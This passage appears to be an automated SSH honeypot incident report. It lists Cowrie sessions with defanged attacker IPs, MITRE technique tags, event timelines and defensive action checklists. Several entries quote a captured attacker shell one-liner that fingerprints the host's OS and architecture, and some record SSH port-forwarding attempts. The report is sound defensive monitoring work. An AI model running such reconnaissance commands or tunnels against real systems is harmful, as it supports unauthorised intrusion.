- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c49e2bbe37d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]8` |
| **First Seen** | 2026-08-01 13:49 |
| **Last Seen** | 2026-08-01 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:49:23` | `cowrie.session.connect` |
| `2026-08-01 13:49:23` | `cowrie.client.version` |
| `2026-08-01 13:49:23` | `cowrie.client.kex` |
| `2026-08-01 13:49:23` | `cowrie.login.success` |
| `2026-08-01 13:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]8` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e096c70752

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 13:49 |
| **Last Seen** | 2026-08-01 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:49:24` | `cowrie.session.connect` |
| `2026-08-01 13:49:24` | `cowrie.client.version` |
| `2026-08-01 13:49:24` | `cowrie.client.kex` |
| `2026-08-01 13:49:25` | `cowrie.login.success` |
| `2026-08-01 13:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fb34f87f45

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:50 |
| **Last Seen** | 2026-08-01 13:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:50:00` | `cowrie.session.connect` |
| `2026-08-01 13:50:00` | `cowrie.client.version` |
| `2026-08-01 13:50:00` | `cowrie.client.kex` |
| `2026-08-01 13:50:04` | `cowrie.login.success` |
| `2026-08-01 13:50:05` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:50:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:50:05` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed14982b3bd5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:50 |
| **Last Seen** | 2026-08-01 13:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:50:35` | `cowrie.session.connect` |
| `2026-08-01 13:50:36` | `cowrie.client.version` |
| `2026-08-01 13:50:36` | `cowrie.client.kex` |
| `2026-08-01 13:50:37` | `cowrie.login.success` |
| `2026-08-01 13:50:37` | `cowrie.session.params` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.success` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:37` | `cowrie.command.input` |
| `2026-08-01 13:50:38` | `cowrie.log.closed` |
| `2026-08-01 13:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8fccdb72e7f

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 13:51 |
| **Last Seen** | 2026-08-01 13:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:51:43` | `cowrie.session.connect` |
| `2026-08-01 13:51:43` | `cowrie.client.version` |
| `2026-08-01 13:51:44` | `cowrie.client.kex` |
| `2026-08-01 13:51:49` | `cowrie.login.success` |
| `2026-08-01 13:51:53` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:51:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:51:54` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0badb4f27e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:52 |
| **Last Seen** | 2026-08-01 13:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:52:10` | `cowrie.session.connect` |
| `2026-08-01 13:52:10` | `cowrie.client.version` |
| `2026-08-01 13:52:10` | `cowrie.client.kex` |
| `2026-08-01 13:52:11` | `cowrie.login.success` |
| `2026-08-01 13:52:12` | `cowrie.session.params` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.success` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.command.input` |
| `2026-08-01 13:52:12` | `cowrie.log.closed` |
| `2026-08-01 13:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac79924f74f2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:53 |
| **Last Seen** | 2026-08-01 13:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:53:42` | `cowrie.session.connect` |
| `2026-08-01 13:53:43` | `cowrie.client.version` |
| `2026-08-01 13:53:43` | `cowrie.client.kex` |
| `2026-08-01 13:53:43` | `cowrie.login.success` |
| `2026-08-01 13:53:45` | `cowrie.session.params` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.success` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.command.input` |
| `2026-08-01 13:53:45` | `cowrie.log.closed` |
| `2026-08-01 13:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745bc60eca05

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:54 |
| **Last Seen** | 2026-08-01 13:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:54:10` | `cowrie.session.connect` |
| `2026-08-01 13:54:10` | `cowrie.client.version` |
| `2026-08-01 13:54:11` | `cowrie.client.kex` |
| `2026-08-01 13:54:17` | `cowrie.login.success` |
| `2026-08-01 13:54:18` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:54:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:54:18` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5caea9a8f18

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:55 |
| **Last Seen** | 2026-08-01 13:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:55:16` | `cowrie.session.connect` |
| `2026-08-01 13:55:16` | `cowrie.client.version` |
| `2026-08-01 13:55:16` | `cowrie.client.kex` |
| `2026-08-01 13:55:17` | `cowrie.login.success` |
| `2026-08-01 13:55:18` | `cowrie.session.params` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.success` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.command.input` |
| `2026-08-01 13:55:18` | `cowrie.log.closed` |
| `2026-08-01 13:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c868b5b17a29

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:55 |
| **Last Seen** | 2026-08-01 13:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:55:55` | `cowrie.session.connect` |
| `2026-08-01 13:55:55` | `cowrie.client.version` |
| `2026-08-01 13:55:55` | `cowrie.client.kex` |
| `2026-08-01 13:55:56` | `cowrie.login.success` |
| `2026-08-01 13:55:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:55:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:55:57` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81e524314c0

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:56 |
| **Last Seen** | 2026-08-01 13:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:56:20` | `cowrie.session.connect` |
| `2026-08-01 13:56:21` | `cowrie.client.version` |
| `2026-08-01 13:56:24` | `cowrie.client.kex` |
| `2026-08-01 13:56:27` | `cowrie.login.success` |
| `2026-08-01 13:56:27` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:56:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:56:30` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ca413e56bca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:56 |
| **Last Seen** | 2026-08-01 13:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:56:56` | `cowrie.session.connect` |
| `2026-08-01 13:56:57` | `cowrie.client.version` |
| `2026-08-01 13:56:57` | `cowrie.client.kex` |
| `2026-08-01 13:56:58` | `cowrie.login.success` |
| `2026-08-01 13:56:58` | `cowrie.session.params` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.success` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.command.input` |
| `2026-08-01 13:56:58` | `cowrie.log.closed` |
| `2026-08-01 13:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79974d61c197

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:58 |
| **Last Seen** | 2026-08-01 13:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:58:39` | `cowrie.session.connect` |
| `2026-08-01 13:58:39` | `cowrie.client.version` |
| `2026-08-01 13:58:39` | `cowrie.client.kex` |
| `2026-08-01 13:58:40` | `cowrie.login.success` |
| `2026-08-01 13:58:41` | `cowrie.session.params` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.success` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.command.input` |
| `2026-08-01 13:58:41` | `cowrie.log.closed` |
| `2026-08-01 13:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84526b60417

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 13:58 |
| **Last Seen** | 2026-08-01 13:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:58:44` | `cowrie.session.connect` |
| `2026-08-01 13:58:44` | `cowrie.client.version` |
| `2026-08-01 13:58:45` | `cowrie.client.kex` |
| `2026-08-01 13:58:47` | `cowrie.login.success` |
| `2026-08-01 13:58:47` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:58:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:58:48` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf294db8312a

| Field | Detail |
|---|---|
| **Source IP** | `65.181.79[.]60` |
| **First Seen** | 2026-08-01 14:00 |
| **Last Seen** | 2026-08-01 14:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:00:01` | `cowrie.session.connect` |
| `2026-08-01 14:00:02` | `cowrie.client.version` |
| `2026-08-01 14:00:02` | `cowrie.client.kex` |
| `2026-08-01 14:00:05` | `cowrie.login.success` |
| `2026-08-01 14:00:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.79[.]60` to AbuseIPDB if not already reported
- [ ] Block `65.181.79[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d585dfeeff90

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-08-01 14:00 |
| **Last Seen** | 2026-08-01 14:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:00:12` | `cowrie.session.connect` |
| `2026-08-01 14:00:13` | `cowrie.client.version` |
| `2026-08-01 14:00:13` | `cowrie.client.kex` |
| `2026-08-01 14:00:15` | `cowrie.login.success` |
| `2026-08-01 14:00:16` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922dce6bbd4e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:00 |
| **Last Seen** | 2026-08-01 14:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:00:19` | `cowrie.session.connect` |
| `2026-08-01 14:00:19` | `cowrie.client.version` |
| `2026-08-01 14:00:19` | `cowrie.client.kex` |
| `2026-08-01 14:00:20` | `cowrie.login.success` |
| `2026-08-01 14:00:21` | `cowrie.session.params` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.success` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.command.input` |
| `2026-08-01 14:00:21` | `cowrie.log.closed` |
| `2026-08-01 14:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d73ae5250a

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 14:01 |
| **Last Seen** | 2026-08-01 14:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
